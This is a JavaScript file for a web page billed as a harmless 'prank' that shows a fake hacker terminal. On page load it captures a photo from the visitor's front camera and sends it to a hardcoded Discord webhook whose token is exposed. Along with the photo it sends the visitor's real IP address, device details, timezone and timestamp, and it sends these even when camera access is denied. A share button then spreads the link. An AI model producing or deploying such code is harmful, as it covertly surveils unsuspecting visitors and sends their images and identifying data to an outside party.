console.log('Script loaded successfully!');

// Terminal-style prank script
// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';

// Camera elements
const cameraContainer = document.getElementById('camera-container');
const video = document.getElementById('camera');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// Function to start the camera
async function startCamera() {
    console.log('Attempting to access camera...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }, // Front camera
            audio: false
        });
        video.srcObject = stream;
        cameraContainer.style.display = 'flex';
        return true;
    } catch (err) {
        console.error('Error accessing camera:', err);
        return false;
    }
}

// Function to capture photo
async function capturePhoto() {
    console.log('Attempting to capture photo...');
    if (!video.srcObject) {
        console.error('No video stream available');
        return null;
    }
    
    // Set canvas size to match video
    const videoTrack = video.srcObject.getVideoTracks()[0];
    const settings = videoTrack.getSettings();
    canvas.width = settings.width || video.videoWidth;
    canvas.height = settings.height || video.videoHeight;
    
    // Draw current video frame to canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Stop all video tracks
    video.srcObject.getTracks().forEach(track => track.stop());
    
    // Hide camera preview
    cameraContainer.style.display = 'none';
    
    // Return the image as base64
    return canvas.toDataURL('image/jpeg', 0.8);
}

// Function to send webhook with photo
async function sendWebhook(photoData = null) {
    console.log('Sending webhook...');
    if (WEBHOOK_URL) {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => 'Unknown IP');
            
        // Get device information
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const colorDepth = `${window.screen.colorDepth} bit`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const timestamp = new Date().toISOString();
        
        // Parse user agent for more details
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
        const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
        
        // Create embed with or without photo
        const embed = {
            title: '🌐 Website Visitor',
            description: photoData 
                ? '📸 Captured image from visitor!'
                : '⚠️ Could not capture image (camera access denied)',
            color: photoData ? 0x00ff00 : 0xff0000,
            fields: [
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '🕒 Timestamp', value: timestamp, inline: true },
                { name: '🌍 Timezone', value: timezone, inline: true },
                { name: '💻 Platform', value: platform, inline: true },
                { name: '📱 Device Type', value: isMobile ? 'Mobile' : 'Desktop', inline: true },
                { name: '🔍 Screen', value: `${screenRes} (${colorDepth})`, inline: true },
                { name: '🌐 Browser', value: browser, inline: true },
                { name: '🖥️ OS', value: os, inline: true },
                { name: '🌐 Language', value: language, inline: true }
            ]
        };
        
        // Prepare webhook data
        const webhookData = {
            embeds: [embed],
            content: '🚀 Someone Has Opened The Website!'
        };

        // If we have photo data, add it as an attachment
        if (photoData) {
            // Convert base64 to blob
            const blob = await (await fetch(photoData)).blob();
            const file = new File([blob], 'capture.jpg', { type: 'image/jpeg' });
            
            // Create form data
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(webhookData));
            formData.append('file', file);
            
            // Send with form data for file upload
            return fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
        }
        
        // Send without file
        return fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
        });
    }
}

// Main function to run the prank
async function runPrank() {
    try {
        // Try to capture photo first
        const cameraAccess = await startCamera();
        
        if (cameraAccess) {
            // Wait a moment for user to see the camera
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Capture photo and send webhook
            const photoData = await capturePhoto();
            await sendWebhook(photoData);
        } else {
            // If camera access is denied, just send the webhook without photo
            await sendWebhook();
        }
    } catch (error) {
        console.error('Error in prank:', error);
        // If anything fails, still try to send basic webhook
        await sendWebhook();
    }
}

// Start the prank when page loads
console.log('Starting prank...');
runPrank().catch(error => {
    console.error('Error in prank execution:', error);
});

document.addEventListener('DOMContentLoaded', () => {
    // Get DOM elements
    const terminal = document.getElementById('terminal');
    const ipLine = document.getElementById('ip-line');
    const cookiesLine = document.getElementById('cookies-line');
    const accountLine = document.getElementById('account-line');
    const jokeLine = document.getElementById('joke-line');
    const revealLine = document.getElementById('reveal-line');
    
    // Typewriter effect
    function typeWriter(element, text, speed = 10, callback) {
        let i = 0;
        element.innerHTML = '';
        
        function type() {
            if (i < text.length) {
                element.innerHTML += text.charAt(i);
                i++;
                setTimeout(type, speed);
            } else if (callback) callback();
        }
        type();
    }
    
    // Get a random IP address
    function getRandomIp() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    // Fixed location
    const location = 'England, UK';
    
    // Start the sequence
    setTimeout(() => {
        // Show IP address with fixed location
        typeWriter(ipLine, `> IP Address: ${getRandomIp()} (${location})`, 10, () => {
            // Show data collection message
            setTimeout(() => {
                typeWriter(cookiesLine, '> Scanning device for personal data...', 10, () => {
                    // Show fake data found
                    setTimeout(() => {
                        typeWriter(accountLine, '> Data collection complete!', 10, () => {
                            // Show joke message
                            setTimeout(() => {
                                typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
                                    // Final reveal
                                    setTimeout(() => {
                                        typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
                                            // Add a share button
                                            const button = document.createElement('button');
                                            button.className = 'button';
                                            button.textContent = 'Made By @Phonzr';
                                            button.onclick = () => {
                                                if (navigator.share) {
                                                    navigator.share({
                                                        title: 'Check this out!',
                                                        text: 'I found something interesting!',
                                                        url: window.location.href
                                                    });
                                                } else {
                                                    alert('Share this link: ' + window.location.href);
                                                }
                                            };
                                            terminal.appendChild(button);
                                        });
                                    }, 1000);
                                });
                            }, 1000);
                        });
                    }, 1000);
                });
            }, 1000);
        });
    }, 500);
    
    // Prevent context menu on right-click
    document.addEventListener('contextmenu', (e) => e.preventDefault());
});
